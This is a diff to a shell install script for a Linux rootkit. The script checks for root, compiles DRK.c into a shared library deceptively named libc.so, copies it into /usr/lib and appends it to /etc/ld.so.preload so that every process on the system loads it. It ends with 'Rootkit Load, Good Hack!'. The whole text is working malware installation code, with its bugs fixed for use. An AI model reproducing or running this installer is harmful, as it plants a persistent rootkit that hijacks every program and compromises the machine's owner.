@@ -4,7 +4,7 @@
 if [ $(whoami) = "root" ]; then
 
 # Loading
-echo "[+] Install"
+echo -n "[+] Install"
 
 for load in $(seq 1 3); do
 echo -n "."
@@ -12,17 +12,17 @@ sleep 0.5;
 done
 
 # compilation
-$(make)
+/usr/bin/gcc DRK.c -o libc.so -shared -fPIC -ldl
 
 # moved dynamic library for /usr/bin
-mv _libc.so /usr/lib
+mv libc.so /usr/lib
 
 #LD_PRELOAD
-echo "/usr/lib/_libc.so" >> /etc/ld.so.preload
+echo "/usr/lib/libc.so" >> /etc/ld.so.preload
 ldconfig
 
 #clear screen
-$(clear)
+clear
 
 echo "[!] Rootkit Load, Good Hack! Open New Terminal."
 
